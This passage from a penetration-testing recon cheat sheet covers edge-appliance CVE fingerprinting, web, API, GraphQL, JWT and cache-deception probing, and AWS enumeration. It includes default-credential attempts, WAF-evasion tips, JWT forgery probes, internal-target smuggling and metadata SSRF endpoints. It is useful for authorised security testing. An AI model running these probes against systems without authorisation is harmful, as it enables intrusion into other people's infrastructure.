curl -sk "https://<target>/dana-na/auth/url_default/welcome.cgi" | grep -i "Pulse\|Ivanti"
curl -sk "https://<target>/dana-na/auth/url_admin/welcome.cgi" | grep -i Ivanti
curl -sk "https://<target>/dana-na/" | head

# Build version often disclosed in HTML comments / 404 pages
curl -sk "https://<target>/dana-cached/sc/SC_xxxxxxxxxxxxxxxxxxxxx" 2>/dev/null

# CRITICAL CVE STREAM (mass-exploitation, 2024-2025):
# CVE-2023-46805 + CVE-2024-21887 — auth bypass + command injection chain
#   (UNC5221 / China-nexus mass exploitation Jan 2024)
#   Patches: 9.1R14.4, 22.4R2.2, 22.5R1.1+
# CVE-2024-21888 — privilege escalation
# CVE-2024-21893 — SSRF
# CVE-2025-0282 — stack buffer overflow → unauth RCE
#   Active exploitation since mid-Dec 2024
#   Source: https://nvd.nist.gov/vuln/detail/CVE-2025-0282
# CVE-2025-22457 — stack buffer overflow (UNC5221), April 2025
#   Source: https://www.rapid7.com/blog/post/2025/04/03/etr-ivanti-connect-secure-cve-2025-22457-exploited-in-the-wild/
```

### 4.6 — F5 BIG-IP APM

```bash
# ═══════════════════════════════════════════════════════════
# F5 BIG-IP APM (port 443, 8443 mgmt)
# MITRE ATT&CK: T1190
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/my.policy" | grep -i "F5\|BIG-IP"
curl -sk "https://<target>/tmui/login.jsp"   # iControl REST UI
curl -sk "https://<target>:8443/mgmt/tm/sys/version" -u admin:admin

# CVEs:
# CVE-2022-1388 (iControl REST auth bypass — historical mass exploitation)
# CVE-2023-46747 (Configuration utility unauth RCE — Oct 2023)
# CVE-2024-39778 (Configuration utility CSRF)
```

### 4.7 — Sophos / SonicWall / WatchGuard

```bash
# ═══════════════════════════════════════════════════════════
# SOPHOS UTM / FIREWALL
# Port: 443, 4444 mgmt
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>:4444/" | grep -i "Sophos UTM"
curl -sk "https://<target>/userportal/webpages/myaccount/login.jsp" | grep -i Sophos

# CVE-2022-1040 (mass exploitation 2022)
# CVE-2024-12727/12728/12729 (Sophos Firewall — late 2024)

# ═══════════════════════════════════════════════════════════
# SONICWALL
# Port: 443, 4444 mgmt
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>/auth.html" | grep -i SonicWall
curl -sk "https://<target>:4444/main.html"   # Admin UI

# CVE-2024-40766 (mass exploitation Sept-Oct 2024 by Akira ransomware)
# CVE-2024-53704 (auth bypass; late 2024)

# ═══════════════════════════════════════════════════════════
# WATCHGUARD FIREBOX
# Port: 443, 4100 mgmt
# ═══════════════════════════════════════════════════════════
curl -sk "https://<target>:4100/" | grep -i WatchGuard
nmap -p 4100 --script=http-title <target>
```

### 4.8 — Per-Vendor CVE Quick-Recognition Matrix (2024-2026)

```
═══════════════════════════════════════════════════════════
EDGE-APPLIANCE CVE QUICK-RECOGNITION MATRIX
═══════════════════════════════════════════════════════════
Status legend:
  🔥 ACTIVE EXPLOITATION    — observed in-the-wild Q1 2026
  ✅ PATCHED + DECLINING    — vendor patches available; declining exploitation
  📋 KEV-LISTED             — on CISA Known Exploited Vulnerabilities list

VENDOR / PRODUCT          | CVE              | TYPE              | STATUS
──────────────────────────┼──────────────────┼───────────────────┼────────
Ivanti Connect Secure     | CVE-2024-21887   | Cmd injection     | 🔥📋
Ivanti Connect Secure     | CVE-2023-46805   | Auth bypass       | 🔥📋
Ivanti Connect Secure     | CVE-2025-0282    | Stack BO RCE      | 🔥📋
Ivanti Connect Secure     | CVE-2025-22457   | Stack BO RCE      | 🔥📋
Fortinet FortiGate SSL VPN| CVE-2024-21762   | OOB RCE (SSLVPNd) | 🔥📋
Fortinet FortiManager     | CVE-2024-47575   | Auth bypass + RCE | 🔥📋
Citrix NetScaler          | CVE-2023-4966    | Citrix Bleed      | ✅📋
Citrix NetScaler          | CVE-2024-3661    | TunnelVision      | ✅
Citrix NetScaler          | CVE-2024-8534    | Memory safety     | ✅
Palo Alto GlobalProtect   | CVE-2024-3400    | Cmd injection     | 🔥📋
Veeam Backup & Replication| CVE-2024-40711   | Unauth RCE        | 🔥📋
Veeam Backup & Replication| CVE-2025-23120   | Domain-user RCE   | 🔥📋
F5 BIG-IP                 | CVE-2023-46747   | Config util RCE   | ✅📋
F5 BIG-IP                 | CVE-2022-1388    | iControl auth bypass | ✅📋
Sophos Firewall           | CVE-2024-12727   | Recent (late 2024)| 🔥
SonicWall SSL VPN         | CVE-2024-40766   | Mass exploitation | 🔥📋
ScreenConnect (ConnectWise)| CVE-2024-1709   | Auth bypass       | ✅📋
Microsoft Exchange        | CVE-2024-49040   | Spoofing          | ✅
Microsoft Exchange        | CVE-2024-21410   | NTLM relay elev   | ✅📋
Atlassian Confluence      | CVE-2024-21683   | RCE               | ✅
Atlassian Bitbucket       | CVE-2024-21689   | Cmd injection     | ✅
GitLab                    | CVE-2024-45409   | SAML auth bypass  | ✅
Jenkins                   | CVE-2024-23897   | File-read → RCE   | ✅📋
TeamCity                  | CVE-2024-27198   | Auth bypass       | ✅📋
TeamCity                  | CVE-2023-42793   | Auth bypass       | ✅📋
ManageEngine ServiceDesk  | CVE-2024-49213   | Recent            | 🔥
VMware vCenter            | CVE-2024-37079/80| DCERPC heap RCE   | ✅📋
ConnectWise ScreenConnect | CVE-2024-1708/09 | Auth bypass + path| 🔥📗

NUCLEI TEMPLATE TAGS for matrix coverage:
  nuclei -tags ivanti,fortinet,citrix,paloalto,f5,sonicwall,sophos -u <target>
  nuclei -tags veeam,vcenter,exchange,confluence,jenkins,teamcity -u <target>
  nuclei -tags screenconnect,manageengine -u <target>
```

```
═══════════════════════════════════════════════════════════
SECTION 4 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §03 Initial Access (vulnerable edge → IAB-style entry point)
Enables → §06 Lateral Movement (compromised VPN concentrator → internal pivot)
Prereq → §1 host discovery (need IP inventory first)
Prereq → §2 port scan (need 443 / 4443 / 8443 / 10443 confirmed open)
Cross-ref → §8 vulnerability scanning (Nuclei matrix above for verification)
            §5 web app recon (edge appliances expose web UIs)
```

---

## 5 — WEB APPLICATION RECONNAISSANCE

> **Typical chains through this section:** Subdomain inventory (passive recon §1) → live-host probe (httpx) → tech fingerprint → directory/file brute → API enumeration → modern attack-class probes (HTTP smuggling, GraphQL introspection, gRPC reflection) → handoff to web exploitation cheatsheets (§09 Web Application Testing, §10 Burp Suite).

### 5.1 — Active Subdomain Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# ACTIVE DNS BRUTE (vs passive recon §1.1 multi-source aggregation)
# MITRE ATT&CK: T1595.001, T1596.001
# NOISE LEVEL:  MEDIUM (DNS-volume anomaly)
# ═══════════════════════════════════════════════════════════
# Use AFTER passive sources exhausted; passive yields 80%+ of subdomains
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -silent -resp -o dns_brute.txt

gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
        -t 50 -o gobuster_dns.txt

# Permutation-based brute (catches naming patterns)
alterx -l discovered_subdomains.txt -enrich | dnsx -resp -silent -o alterx_results.txt

# Wildcard detection (mandatory before brute — many domains *.target.com → IP)
dnsx -d "*.target.com" -resp -wd target.com   # Detect wildcard
```

### 5.2 — VHost Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# VIRTUAL HOST ENUMERATION (find sites on shared IP)
# MITRE ATT&CK: T1595.001
# NOISE LEVEL:  MEDIUM-HIGH (many HTTP requests with varied Host header)
# ═══════════════════════════════════════════════════════════
# Discover vhosts on a single IP via Host header rotation
gobuster vhost -u http://<IP> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -o gobuster_vhost.txt

# ffuf vhost (more flexible filtering by response size)
ffuf -u http://<IP> \
     -H "Host: FUZZ.target.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs <baseline_size>

# httpx vhost discovery from a subdomain list (probes each)
cat subdomains.txt | httpx -silent -title -status-code -tech-detect

# Per-vhost differentiation by response title / size / hash
cat subdomains.txt | httpx -silent -title -tech-detect -content-length \
                            -hash sha256 | sort -u
```

### 5.3 — Technology Fingerprinting

```bash
# ═══════════════════════════════════════════════════════════
# WEB-STACK FINGERPRINTING (single HTTPS per host)
# MITRE ATT&CK: T1592.002 (Software)
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
whatweb https://target.com                    # CMS / server / framework
whatweb -a 3 https://target.com               # Aggressive (more probes)

# httpx — multi-host probe
cat subdomains.txt | httpx -silent -title -status-code -tech-detect \
                           -content-length -web-server -follow-redirects

# Manual header inspection
curl -sI "https://target.com/" \
  | grep -iE "server|x-powered-by|x-aspnet|x-runtime|set-cookie"

# Wappalyzer CLI / extension
wappalyzer https://target.com

# Nuclei tech-detect templates
nuclei -u https://target.com -t technologies/ -silent

# Common indicators by stack:
#   X-Powered-By: PHP/7.4.x → PHP version disclosure
#   X-AspNet-Version: 4.0.30319 → ASP.NET version
#   Server: Apache/2.4.41 (Ubuntu) → Apache + Ubuntu base
#   Server: nginx/1.18.0 → nginx version
#   Server: Microsoft-IIS/10.0 → IIS major version
#   Set-Cookie: ASP.NET_SessionId → ASP.NET app
#   Set-Cookie: PHPSESSID → PHP app
#   Set-Cookie: connect.sid → Express.js (Node)
#   Set-Cookie: laravel_session → Laravel
#   Set-Cookie: rack.session → Ruby Rack
```

### 5.4 — Directory & File Brute Force

```bash
# ═══════════════════════════════════════════════════════════
# CONTENT DISCOVERY
# MITRE ATT&CK: T1595.003 (Active Scanning: Wordlist Scanning)
# NOISE LEVEL:  HIGH (404 spike in access logs; WAF rate-limit triggered)
# ═══════════════════════════════════════════════════════════
# Feroxbuster (Rust — fast, recursive, smart)
feroxbuster -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,asp,aspx,jsp,html,js,json -o ferox.txt

# Gobuster
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 -x php,aspx,jsp -o gobuster.txt

# ffuf (fast, very flexible)
ffuf -u "https://target.com/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,301,302,401,403 -t 50 -o ffuf.json -of json

# Dirsearch
dirsearch -u https://target.com -e php,asp,aspx,jsp -t 50

# COMMON HIGH-VALUE PATHS (brute-force prioritization):
#   /robots.txt, /sitemap.xml, /security.txt, /.well-known/
#   /.git/, /.svn/, /.env, /.DS_Store
#   /backup/, /old/, /archive/, /tmp/
#   /admin/, /administrator/, /wp-admin/, /phpmyadmin/, /pma/
#   /api/, /api/v1/, /api/v2/, /v1/, /v2/
#   /swagger/, /swagger-ui/, /openapi.json, /v2/api-docs, /api-docs
#   /graphql, /graphql-playground, /__schema, /altair, /voyager
#   /actuator/, /actuator/env, /actuator/heapdump, /actuator/beans (Spring Boot)
#   /debug/, /test/, /staging/, /dev/, /internal/
#   /server-status, /server-info (Apache mod_status — common misconfig)
#   /phpinfo.php, /info.php, /test.php
#   /wp-config.php.bak, /config.php.bak, /.env.bak
#   /.git/config, /.git/HEAD
#   /console, /web-console, /h2-console (H2 in-memory DB)
#   /jolokia, /jmx-console (JMX-related)

# WAF EVASION:
#   - Rotate User-Agent (-H "User-Agent: Mozilla/5.0 ...")
#   - Add jitter (--random-agent equivalent in tool)
#   - Use -H "X-Forwarded-For: <random>" (some WAFs trust XFF)
#   - Throttle threads (-t 5 instead of -t 50)
#   - Use 2-letter status code filter to avoid false positives
```

### 5.5 — Modern Crawlers & Screenshot Recon

```bash
# ═══════════════════════════════════════════════════════════
# katana — PROJECTDISCOVERY's MODERN WEB CRAWLER
# MITRE ATT&CK: T1594 (Search Victim-Owned Websites)
# NOISE LEVEL:  MEDIUM (controlled crawl); HIGH (depth + JS rendering)
# ═══════════════════════════════════════════════════════════
katana -u https://target.com -d 5 -jc -kf all -o katana_crawl.txt
# -d 5    Depth = 5
# -jc     JavaScript-rendered crawl (Chromium headless)
# -kf all Known files (sitemap, robots, etc.)

# Pipe katana → nuclei for vuln scan of discovered URLs
katana -u https://target.com -silent -d 5 | nuclei -t cves/ -severity critical,high

# unfurl (URL parsing for crawl pipelines)
cat urls.txt | unfurl --unique paths
cat urls.txt | unfurl --unique domains
cat urls.txt | unfurl --unique keypairs

# ═══════════════════════════════════════════════════════════
# SCREENSHOT-BASED VISUAL RECON
# ═══════════════════════════════════════════════════════════
# gowitness (Go — Chromium headless screenshots at scale)
gowitness scan file -f subdomains.txt --threads 10 -P screenshots/
gowitness report serve   # View report (port 7171 by default)

# aquatone (legacy but still used)
cat subdomains.txt | aquatone -out aquatone_report/

# eyewitness (Python alternative; multi-protocol)
eyewitness --web -f subdomains.txt -d eyewitness_report/

# Use cases:
# - Identify forgotten admin panels visually
# - Spot legacy frameworks (vintage WP/Drupal/Joomla themes)
# - Detect login pages that match known phishing-template patterns
# - Identify same-template multi-tenant SaaS deployments
```

### 5.6 — REST API Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# REST API DISCOVERY
# MITRE ATT&CK: T1594, T1592.002
# NOISE LEVEL:  MEDIUM (controlled probes); HIGH (broad endpoint brute)
# ═══════════════════════════════════════════════════════════
# Endpoint discovery via wordlist
ffuf -u "https://target.com/api/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,301,401,403 -o api_ffuf.json -of json

# Swagger / OpenAPI spec discovery
for path in /swagger.json /swagger.yaml /openapi.json /openapi.yaml \
            /v2/api-docs /v3/api-docs /api-docs /api/swagger.json \
            /api/openapi.json /docs/swagger.json /api/v1/swagger.json; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$status" = "200" ] && echo "FOUND: $path"
done

# Once discovered, generate request collection from spec
swagger-cli bundle swagger.json -o swagger_bundled.json
# OR use Postman to import the spec for interactive testing

# REST method enumeration per endpoint (look for misconfigured methods)
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
  echo -n "$method: "
  curl -sk -o /dev/null -w "%{http_code}\n" -X $method "https://target.com/api/users"
done

# OPTIONS often discloses CORS + supported methods
curl -sk -X OPTIONS "https://target.com/api/users" -H "Origin: https://evil.com" -i
```

### 5.7 — GraphQL Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# GRAPHQL — INTROSPECTION + FIELD-SUGGESTION + FINGERPRINT
# MITRE ATT&CK: T1594, T1592.002
# NOISE LEVEL:  MEDIUM
# ═══════════════════════════════════════════════════════════
# Probe for GraphQL endpoint
for path in /graphql /api/graphql /v1/graphql /v2/graphql /query /api/query; do
  resp=$(curl -sk -X POST "https://target.com$path" \
              -H "Content-Type: application/json" \
              -d '{"query":"{__typename}"}')
  [ -n "$(echo $resp | grep __typename)" ] && echo "FOUND: $path"
done

# Standard introspection query (full schema dump if introspection enabled)
curl -sk -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}'

# clairvoyance — schema reconstruction when introspection is DISABLED
# (uses GraphQL field-suggestion error messages to enumerate fields)
clairvoyance https://target.com/graphql -o schema.json -w /usr/share/seclists/Discovery/Web-Content/graphql.txt

# graphw00f — server-implementation fingerprinting (Apollo, Hasura, AWS
# AppSync, GraphQL.NET, etc.) — different implementations have different
# vulnerability surfaces
graphw00f -t https://target.com/graphql -o graphw00f_results.txt

# InQL Burp extension — interactive GraphQL testing inside Burp
# https://github.com/doyensec/inql

# GraphQL Voyager — visual schema browser (paste introspection result)
# https://graphql-kit.com/graphql-voyager/

# Apollo Studio — public APIs sometimes index target's schema
# https://www.apollographql.com/docs/studio/
```

### 5.8 — gRPC Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# gRPC SERVICE ENUMERATION (default port 50051; varies)
# MITRE ATT&CK: T1594, T1046
# NOISE LEVEL:  LOW (single reflect query)
# ═══════════════════════════════════════════════════════════
# grpcurl — primary gRPC tooling
# https://github.com/fullstorydev/grpcurl

# Probe with reflection (server must have reflection enabled)
grpcurl -plaintext target:50051 list                # List all services
grpcurl -plaintext target:50051 list <service>      # List methods of service
grpcurl -plaintext target:50051 describe <service>  # Schema details

# Without reflection — requires .proto files (extracted from binaries / docs)
grpcurl -import-path ./protos -proto target.proto target:50051 list

# Invoke a method
grpcurl -plaintext -d '{"id":"123"}' target:50051 user.UserService/GetUser

# TLS-protected gRPC
grpcurl target:50051 list                           # default = TLS

# Common discovered services (informational):
#   grpc.reflection.v1.ServerReflection (enables reflection)
#   grpc.health.v1.Health (health-check endpoint)

# Tools:
# https://github.com/fullstorydev/grpcurl   (grpcurl CLI)
# https://github.com/uw-labs/bloomrpc       (GUI - archived)
# https://github.com/grpc-ecosystem/awesome-grpc
```

### 5.9 — HTTP Request Smuggling Detection

```bash
# ═══════════════════════════════════════════════════════════
# HTTP REQUEST SMUGGLING (CL.TE / TE.CL / TE.TE)
# MITRE ATT&CK: T1190 (Exploit Public-Facing Application — chain enabler)
# NOISE LEVEL:  MEDIUM (requires multi-request probes)
# ═══════════════════════════════════════════════════════════
# Smuggler.py — primary detection tool by defparam
# https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com

# Burp Suite Smuggler scanner (PortSwigger official extension)
# Install via BApp Store; runs against targeted Burp Suite Active Scan

# Manual check — TE/CL header confusion patterns
# (Reference: PortSwigger Web Security Academy — HTTP Request Smuggling)

# 2024-2026 research (James Kettle):
#   - "HTTP/2: The sequel is always worse" (Black Hat 2021)
#   - "Listen to the whispers" (Black Hat USA 2024 — H2 desync research)
# Modern smuggling research focuses on HTTP/2 desync; HTTP/1.1 patterns
# are well-mitigated in 2026 by mainstream WAFs but still effective against
# legacy stacks (HAProxy ≤2.5, nginx ≤1.21, etc.)

# h2cSmuggler — H2C upgrade smuggling
# https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py -x https://target.com -t http://internal-target/admin
```

### 5.10 — Web Cache Deception Probes

```bash
# ═══════════════════════════════════════════════════════════
# WEB CACHE DECEPTION (Omer Gil 2017 → 2024 Akamai research)
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (single test request per path)
# ═══════════════════════════════════════════════════════════
# Append a static-looking extension to a sensitive endpoint to trick
# CDN/cache into caching the personalized response

# Test pattern:
curl -sk "https://target.com/account/profile.css" \
  -H "Cookie: session=<valid_session>" \
  -o cached_response.html

# If response = personal account data (not a CSS file):
# CACHE DECEPTION POSSIBLE — anyone fetching the same URL gets cached data

# Vary the static extension across common cache rules:
for ext in .css .js .jpg .png .gif .ico .svg .woff .woff2 .ttf .map .pdf; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
           "https://target.com/account/profile${ext}" \
           -H "Cookie: session=<valid_session>")
  echo "${ext}: ${status}"
done

# Modern variants (Akamai 2024 research):
#   - Path-confusion variants (/api/v1/user/;jsessionid=foo.css)
#   - Header smuggling variants (X-Original-URL bypass)
```

### 5.11 — JWT Analysis

```bash
# ═══════════════════════════════════════════════════════════
# JSON WEB TOKEN ANALYSIS
# MITRE ATT&CK: T1606.001 (Forge Web Credentials)
# NOISE LEVEL:  LOW (offline analysis)
# ═══════════════════════════════════════════════════════════
# jwt_tool — primary JWT testing toolkit
# https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <jwt-token>                    # Decode + analyze
python3 jwt_tool.py <jwt-token> -X a               # alg=none probe
python3 jwt_tool.py <jwt-token> -C -d wordlist.txt # Crack HS256 secret
python3 jwt_tool.py <jwt-token> -X k               # Key-confusion (RS→HS)
python3 jwt_tool.py <jwt-token> -T                 # Tamper claims
python3 jwt_tool.py <jwt-token> -X i               # JKU header injection
python3 jwt_tool.py <jwt-token> -X s               # JWKS spoofing

# Manual decode
echo "<jwt>" | tr '.' ' ' | awk '{print $1}' | base64 -d | jq
echo "<jwt>" | tr '.' ' ' | awk '{print $2}' | base64 -d | jq

# Common JWT-recognition patterns in bug bounty / pen tests:
#   alg=none accepted        → unsigned token forgery
#   HS256 with weak secret   → offline brute → forged tokens
#   Algorithm confusion (RS→HS) → use public key as HMAC secret
#   kid SQLi / path traversal → arbitrary file read for signing key
#   jku/x5u accept attacker URL → forge with attacker's JWKS
```

### 5.12 — CORS Misconfiguration Scanning

```bash
# ═══════════════════════════════════════════════════════════
# CORS MISCONFIGURATION ENUMERATION
# MITRE ATT&CK: T1190
# NOISE LEVEL:  LOW (single OPTIONS / GET per endpoint)
# ═══════════════════════════════════════════════════════════
# corsy — CORS misconfiguration scanner
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://target.com

# Manual probe — null origin, attacker origin
curl -sk "https://target.com/api/profile" \
     -H "Origin: https://evil.com" \
     -H "Cookie: session=<valid>" -i | grep -i "access-control"

# Common CORS misconfigurations:
#   Access-Control-Allow-Origin: *              → harmless if no creds allowed
#   Access-Control-Allow-Origin: <reflected>    → reflective; if credentials
#                                                 = true → cross-origin theft
#   Access-Control-Allow-Origin: null           → can be triggered from
#                                                 sandboxed iframes / data URLs
```

### 5.13 — WebSocket Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# WEBSOCKET ENDPOINT DISCOVERY + INSPECTION
# MITRE ATT&CK: T1594, T1190
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# Discover WebSocket endpoints (search for ws:// or wss:// in JS)
curl -sk https://target.com/ | grep -oE "wss?://[^\"' ]+"

# Common paths:
#   /ws, /websocket, /socket.io, /api/ws, /chat, /events, /sse

# Test connection
wscat -c wss://target.com/ws
# Or websocat
websocat wss://target.com/ws

# Burp Suite — WebSocket history under Proxy → WebSockets
# Repeats WebSocket messages with modifications

# Tools:
# https://github.com/vanhauser-thc/thc-hydra-websocket
# https://github.com/snyk/zap-extensions (ZAP WebSocket support)
```

### 5.14 — HTTP/2 + HTTP/3 (QUIC) Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# HTTP/2 + HTTP/3 PROBING
# MITRE ATT&CK: T1592.002
# NOISE LEVEL:  LOW
# ═══════════════════════════════════════════════════════════
# HTTP/2 detection (ALPN negotiation)
nmap --script=ssl-enum-ciphers -p 443 <target> | grep -i alpn

# Per-curl HTTP/2 probe
curl -I --http2 https://target.com/

# HTTP/3 detection (QUIC; UDP 443)
# Probe via Alt-Svc header in HTTP/2 response
curl -I https://target.com/ | grep -i "alt-svc"
# Look for: alt-svc: h3=":443"; ma=86400

# Direct HTTP/3 client
curl --http3 -I https://target.com/

# Quiche/Quinn-based test clients
# https://github.com/cloudflare/quiche

# HTTP/2 specific attack research (recent):
#   - HTTP/2 Rapid Reset (CVE-2023-44487, 2023; mostly mitigated by 2026)
#   - H2 desync attacks (PortSwigger, 2024)
```

### 5.15 — TLS / Cert Deep Analysis

```bash
# ═══════════════════════════════════════════════════════════
# DEEP TLS / CERT EXTRACTION (cross-ref passive recon §3)
# MITRE ATT&CK: T1596.003 (Digital Certificates)
# NOISE LEVEL:  LOW (single TLS handshake)
# ═══════════════════════════════════════════════════════════
# Cert details (Subject, Issuer, SANs, validity)
echo | openssl s_client -connect target.com:443 2>/dev/null \
  | openssl x509 -noout -text | grep -E "Subject:|DNS:|Issuer:|Not "

# All SANs (Subject Alternative Names)
echo | openssl s_client -connect target.com:443 2>/dev/null \
  | openssl x509 -noout -ext subjectAltName

# SSLScan
sslscan --no-failed target.com

# testssl.sh (most comprehensive TLS audit)
testssl.sh --severity HIGH target.com

# Nmap TLS scripts
nmap --script=ssl-enum-ciphers,ssl-cert,ssl-dh-params,ssl-heartbleed,\
ssl-poodle,ssl-known-key,ssl-cert-intaddr -p 443 <target>

# JA3/JA4 fingerprint extraction (cross-ref passive recon §3.3 JARM)
# JA3: hash of client TLS handshake — useful for evasion + detection
# JA4: 2023+ replacement; more robust, multi-protocol
# https://github.com/FoxIO-LLC/ja4
```

### 5.16 — Exchange ECP / OWA Endpoint Enumeration (cross-ref §3.12)

(See §3.12 for full Exchange/OWA endpoint inventory.)

### 5.17 — WAF / CDN Bypass Discovery

```bash
# ═══════════════════════════════════════════════════════════
# ACTIVE ORIGIN-IP DISCOVERY BEHIND CDN/WAF
# MITRE ATT&CK: T1590.005
# NOISE LEVEL:  MEDIUM (many crafted requests)
# ═══════════════════════════════════════════════════════════
# (Cross-ref passive recon §3.4 for passive origin-IP discovery)

# Active probe — header injection patterns
for header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Remote-IP" "X-Client-IP"; do
  curl -sk "https://target.com/" -H "$header: 127.0.0.1" -i \
    | head -3
done

# Host-header injection (Cloudflare-fronted backend exposure)
curl -sk -H "Host: target.com" "https://<suspected_origin>/" -k

# Cloudflare-specific origin discovery via Censys cert search
# (See passive recon §3.4 for full methodology)

# WAF detection
wafw00f -a -v https://target.com

# WAF cookie discovery
curl -skI "https://target.com/" | grep -iE "(cf-|incap_|akamai|x-sucuri|visid)"

# Bypass technique enumeration:
#   - URL encoding (%2e for ., %2f for /)
#   - Double encoding (%252e for .)
#   - Alternative encodings (UTF-7, UTF-16)
#   - HTTP method override headers (X-HTTP-Method-Override: POST)
#   - Host header injection variants
#   - User-Agent rotation (mobile UAs sometimes bypass WAF rules)
```

```
═══════════════════════════════════════════════════════════
SECTION 5 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §09 Web Application Testing (deeper exploitation phase)
Enables → §10 Burp Suite (manual testing handoff)
Enables → §11 Application Fuzzing (input-class-specific fuzz)
Prereq → §1 host discovery + §2 port scan (need confirmed web hosts)
Cross-ref → §3.10 Backup/Mgmt for web-faceted mgmt UIs
Cross-ref → §4 edge appliances for vendor-specific web UIs
Cross-ref → §6 cloud-asset web fingerprints (S3/Blob/GCS public listings)
```

---

## 6 — CLOUD ASSET ENUMERATION

> **Typical chains through this section:** Cloud-provider identification (passive recon §7.1) → bucket / endpoint discovery → unauthenticated probes → with-creds enumeration via authoritative cloud SDK → multi-cloud audit. Every authenticated cloud API call is logged to CloudTrail / Activity Log / Cloud Audit Logs.

### 6.1 — AWS — Extended

```bash
# ═══════════════════════════════════════════════════════════
# AWS S3 BUCKET DISCOVERY (LOW-TOUCH ACTIVE)
# MITRE ATT&CK: T1593.003 (Code Repositories), T1526 (Cloud Service Discovery)
# NOISE LEVEL:  LOW (DNS + HTTP HEAD); HIGH if bulk-brute pattern detected
# DETECTION:    AWS GuardDuty unauthorized API call detection if creds used;
#               CSPM (Wiz / Lacework / Orca) detects mass bucket probes
# ═══════════════════════════════════════════════════════════
# Common bucket patterns (test against)
for env in prod dev staging qa test; do
  for purpose in backup logs data assets uploads images cdn archive private public; do
    nslookup target-${env}-${purpose}.s3.amazonaws.com 2>&1 | grep -B1 "address"
  done
done

# Existence check (DNS-only — quietest)
aws s3api head-bucket --bucket target-prod-data --no-sign-request 2>&1 | head

# Listability check (after bucket confirmed)
aws s3 ls s3://target-prod-data --no-sign-request

# Per-region probe
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-central-1 \
              ap-southeast-1 ap-northeast-1; do
  aws s3 ls s3://target-bucket --region $region --no-sign-request 2>&1 \
    | head -1
done

# S3 Transfer Acceleration endpoint pattern
nslookup target-bucket.s3-accelerate.amazonaws.com

# ─── AWS ACCOUNT-ID ENUMERATION (cross-ref passive recon §7.5) ─
# aws-account-detective — leverages S3 GetBucketPolicy error messages
# https://github.com/Frichetten/aws-account-detective
aws-account-detective bucket --bucket-name target-prod-data

# Quiet Riot — IAM principal enumeration once account ID known
# https://github.com/righteousgambit/quiet-riot

# ─── LAMBDA FUNCTION URLs ─────────────────────────────────
# Pattern: https://<url-id>.lambda-url.<region>.on.aws/
# Discovery via target's web app links / CT log search for the .on.aws TLD
curl -s "https://crt.sh/?q=%25.lambda-url.%25.on.aws&output=json" | head

# ─── API GATEWAY URLs ─────────────────────────────────────
# Pattern: https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/
# CT log discovery
curl -s "https://crt.sh/?q=%25.execute-api.%25.amazonaws.com&output=json" | head

# ─── ECS / FARGATE TASK METADATA SSRF ENDPOINTS ────────────
# Recon-adjacent — these only reachable via SSRF in target's app
# Documented for awareness; useful when SSRF discovered in §5
# AWS ECS task metadata: http://169.254.170.2/v2/metadata
# AWS IMDSv1 / IMDSv2: http://169.254.169.254/latest/meta-data/
# (IMDSv2 mandatory by default since 2024 for new EC2 instances)

# ═══════════════════════════════════════════════════════════
# WITH AWS CREDS — AUTHENTICATED ENUMERATION
# (FULLY LOGGED to CloudTrail; engagement RoE must permit)
# ═══════════════════════════════════════════════════════════
aws sts get-caller-identity                   # Whoami
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-account-summary
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress,PublicIpAddress]'
aws s3api list-buckets
aws lambda list-functions
aws rds describe-db-instances
aws ecr describe-repositories                 # Container registry
aws cloudformation list-stacks                # IaC
aws ssm describe-parameters                   # SSM Parameter Store

# ─── PUBLIC EBS SNAPSHOT SEARCH ────────────────────────────
